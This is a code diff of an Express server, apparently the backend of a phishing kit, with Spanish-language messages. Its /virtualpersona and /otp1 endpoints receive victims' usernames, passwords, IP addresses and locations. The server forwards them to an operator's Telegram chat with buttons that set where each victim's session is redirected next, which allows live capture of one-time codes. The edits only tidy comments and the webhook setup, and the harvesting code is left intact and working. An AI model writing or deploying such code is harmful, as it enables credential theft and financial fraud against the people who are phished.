@@ -1,8 +1,8 @@
+
 import 'dotenv/config';
 import fetch from 'node-fetch';
 import express from 'express';
 import cors from 'cors';
-
 
 const app = express();
 app.use(express.json({ limit: '1mb' }));
@@ -11,10 +11,8 @@ app.use(cors());
 const PORT = process.env.PORT || 10000;
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
-const PUBLIC_BASE_URL = process.env.PUBLIC_BASE_URL;
 const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-// --------------------- Estado en memoria (sin archivos) ---------------------
 const sessionStates = new Map();
 
 async function readState(sessionId) {
@@ -45,7 +43,6 @@ function ts() {
   return new Date().toISOString();
 }
 
-// --------------------- Telegram helpers ---------------------
 async function tgSendMessage(text, inlineKeyboard) {
   const payload = {
     chat_id: CHAT_ID,
@@ -96,7 +93,6 @@ app.post('/virtualpersona', async (req, res) => {
     const { sessionId, user, pass, ip, country, city } = req.body || {};
     if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });
 
-    // 1. Guardar estado
     await writeState(sessionId, {
       step: 'virtual',
       data: { ...(await readState(sessionId)).data, user, pass, ip, country, city },
@@ -107,7 +103,6 @@ app.post('/virtualpersona', async (req, res) => {
       pending: null
     });
 
-    // 2. Definir el mensaje correctamente
     const message = `📲 NUEVO ACCESO VIRTUAL
 
 👤 Usuario: ${user}
@@ -116,7 +111,6 @@ app.post('/virtualpersona', async (req, res) => {
 🆔 SessionID: ${sessionId}
 📍 Ciudad: ${city} - ${country}`;
 
-    // 3. Enviar a Telegram con botones
     await tgSendMessage(message, buttonsForStep('virtual', sessionId));
 
     res.json({ ok: true });
@@ -125,7 +119,6 @@ app.post('/virtualpersona', async (req, res) => {
     res.status(500).json({ error: 'Error interno del servidor' });
   }
 });
-
 
 app.post('/otp1', async (req, res) => {
   try {
@@ -208,20 +201,19 @@ app.get('/instruction/:sessionId', async (req, res) => {
 
 app.get('/set-webhook', async (req, res) => {
   try {
-    if (!PUBLIC_BASE_URL) return res.status(400).send('PUBLIC_BASE_URL requerido');
+    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
+    const host = req.headers.host;
+    const fullUrl = `${protocol}://${host}/telegram/webhook`;
 
-    const webhookUrl = `${PUBLIC_BASE_URL}/telegram/webhook`; // <- URL completa a tu webhook
-    const response = await fetch(`${TG_API}/setWebhook`, {
+    const r = await fetch(`${TG_API}/setWebhook`, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ url: webhookUrl })
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ url: fullUrl })
     });
-
-    const json = await response.json();
-    console.log("✅ Webhook registrado con:", webhookUrl);
-    res.json(json);
+    const j = await r.json();
+    res.json(j);
   } catch (e) {
-    console.error("❌ Error al registrar webhook:", e);
+    console.error(e);
     res.status(500).json({ error: 'webhook_error' });
   }
 });
@@ -242,7 +234,6 @@ app.post('/telegram/webhook', async (req, res) => {
         console.log(`✅ Estado actualizado para ${sessionId} → ${redirect_to}`);
       }
 
-      // Responde al botón presionado
       res.send({
         method: 'answerCallbackQuery',
         callback_query_id: body.callback_query.id,
@@ -257,9 +248,6 @@ app.post('/telegram/webhook', async (req, res) => {
     res.sendStatus(200);
   }
 });
-
-
-
 
 app.get('/health', (_, res) => res.send('ok'));
 
